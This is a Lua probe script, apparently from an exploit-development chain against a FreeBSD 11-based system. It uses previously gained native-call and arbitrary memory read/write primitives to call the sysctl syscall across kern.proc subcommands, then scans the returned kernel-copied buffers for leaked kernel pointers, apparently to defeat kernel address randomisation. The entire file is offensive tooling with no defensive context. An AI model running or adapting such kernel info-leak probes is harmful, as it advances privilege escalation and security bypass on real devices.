-- CRASH_CLASS: LOW
-- PROBE 400d: kern.proc subcmd 32 deep scan — 45360 bytes available
--
-- 400c found subcmd 32 returns ret=0 need=45360 bytes.
-- On FreeBSD 11, subcmd numbers differ from newer versions.
-- Whatever this is, 45KB of kernel-copied data needs scanning
-- with the corrected kernel pointer filter.
-- Also sweep subcmds 0-50 to find all that return data.

print("=== PROBE 400d: kern.proc subcmd sweep ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive()
    local ok, v = pcall(function() return native.fcall_with_rax(stub, 20) end)
    return ok and N(v) == pid_val
end

local function is_kptr(hi, lo)
    if hi == nil or lo == nil then return false end
    if hi >= 0xFFFF8000 and hi < 0xFFFFFFFF and lo ~= 0 then return true end
    if hi == 0xFFFFFFFF then
        if lo == 0 or lo >= 0xFFFFF000 then return false end
        if lo >= 0x80000000 then return true end
    end
    return false
end

local sc202 = mk(202)

-- ============================================
-- PART A: Sweep all subcmds 0-50 for size
-- ============================================
print("-- A: subcmd sweep (size query, miblen=3 and 4) --")

local mib = memory.alloc(20)
wd(N(mib), 1)       -- CTL_KERN
wd(N(mib) + 4, 14)  -- KERN_PROC
local olen = memory.alloc(8)

local working_cmds = {}

for sub = 0, 50 do
    wd(N(mib) + 8, sub)
    wd(N(mib) + 12, pid_val)
    wd(N(mib) + 16, 0)

    -- Try miblen=4 (with pid)
    wq(olen, uint64(0))
    local ok4, rv4 = pcall(function()
        return sc202(uint64(N(mib)), uint64(4), uint64(0),
            uint64(N(olen)), uint64(0), uint64(0))
    end)
    local ret4 = ok4 and N(rv4) or -1
    if ret4 > 0x7FFFFFFF then ret4 = -1 end
    local need4 = rd(N(olen)) or 0

    -- Try miblen=3 (without pid)
    wq(olen, uint64(0))
    local ok3, rv3 = pcall(function()
        return sc202(uint64(N(mib)), uint64(3), uint64(0),
            uint64(N(olen)), uint64(0), uint64(0))
    end)
    local ret3 = ok3 and N(rv3) or -1
    if ret3 > 0x7FFFFFFF then ret3 = -1 end
    local need3 = rd(N(olen)) or 0

    if ret4 == 0 and need4 > 0 then
        print(string.format("  sub=%d mib4: need=%d ★", sub, need4))
        table.insert(working_cmds, {sub, 4, need4})
    elseif ret3 == 0 and need3 > 0 then
        print(string.format("  sub=%d mib3: need=%d ★", sub, need3))
        table.insert(working_cmds, {sub, 3, need3})
    elseif ret4 == 0 and need4 == 0 then
        print(string.format("  sub=%d: ret=0 need=0 (empty)", sub))
    end
    -- Skip printing blocked (-1) ones

    if not alive() then print("CANARY FAIL sweep " .. sub); return end
end

print(string.format("  working subcmds: %d", #working_cmds))
if not alive() then print("CANARY FAIL A"); return end

-- ============================================
-- PART B: Fetch and scan each working subcmd
-- ============================================
print("")
print("-- B: fetch and scan --")

for _, cmd in ipairs(working_cmds) do
    local sub, miblen, need = cmd[1], cmd[2], cmd[3]

    -- Cap at 64KB to avoid OOM
    local alloc_sz = math.min(need + 64, 0x10000)
    local buf = memory.alloc(alloc_sz)
    for i = 0, alloc_sz - 4, 4 do wd(N(buf) + i, 0xDEADDEAD) end

    wd(N(mib) + 8, sub)
    wd(N(mib) + 12, pid_val)
    wq(olen, uint64(alloc_sz))

    local ok_f, rv_f = pcall(function()
        return sc202(uint64(N(mib)), uint64(miblen), uint64(N(buf)),
            uint64(N(olen)), uint64(0), uint64(0))
    end)
    local ret_f = ok_f and N(rv_f) or -1
    if ret_f > 0x7FFFFFFF then ret_f = -1 end
    local got = rd(N(olen)) or 0

    if ret_f == 0 and got > 0 then
        -- Count modified bytes (not sentinel)
        local modified = 0
        local kptr_count = 0
        local kptr_list = {}

        for off = 0, got - 4, 4 do
            local v = rd(N(buf) + off)
            if v and v ~= 0xDEADDEAD then
                modified = modified + 1
            end
            if off + 4 <= got then
                local lo = rd(N(buf) + off)
                local hi = rd(N(buf) + off + 4)
                if lo and hi and is_kptr(hi, lo) then
                    kptr_count = kptr_count + 1
                    if kptr_count <= 10 then
                        table.insert(kptr_list, {off, hi, lo})
                    end
                end
            end
        end

        print(string.format("  sub=%d: got=%d modified=%d kptr=%d",
            sub, got, modified, kptr_count))

        if kptr_count > 0 then
            print(string.format("  ★★★ KERNEL POINTERS in subcmd %d ★★★", sub))
            for _, k in ipairs(kptr_list) do
                print(string.format("    +%04X: %08X_%08X", k[1], k[2], k[3]))
            end
        end

        -- If it's the big one (sub=32, ~45K), try to detect record structure
        if got > 4000 then
            local first_dw = rd(N(buf)) or 0
            print(string.format("    first dword=0x%X (record size?)", first_dw))

            -- Check if first dword is a record size
            if first_dw > 16 and first_dw < 0x2000 and got % first_dw == 0 then
                local nrecs = math.floor(got / first_dw)
                print(string.format("    possible: %d records of %d bytes", nrecs, first_dw))
            end

            -- Dump first 128 bytes as hex
            print("    first 128B:")
            for off = 0, 124, 16 do
                local line = string.format("    +%03X:", off)
                for c = 0, 12, 4 do
                    local v = rd(N(buf) + off + c)
                    line = line .. string.format(" %08X", v or 0)
                end
                print(line)
            end
        end

        -- For smaller outputs, try ASCII
        if got <= 256 and got > 0 then
            local txt = ""
            for i = 0, got - 1 do
                local dw = rd(N(buf) + i - (i % 4)) or 0
                local byte = math.floor(dw / (256 ^ (i % 4))) % 256
                if byte >= 32 and byte < 127 then txt = txt .. string.char(byte)
                elseif byte == 0 then txt = txt .. "."
                else txt = txt .. string.format("\\x%02X", byte) end
            end
            print(string.format("    ascii: %s", txt))
        end
    elseif ret_f == 0 and got == 0 then
        print(string.format("  sub=%d: ret=0 got=0", sub))
    end

    if not alive() then print("CANARY FAIL sub " .. sub); return end
end

print("")
print("canary=" .. (alive() and "OK" or "FAIL"))
print("=== 400d COMPLETE ===")
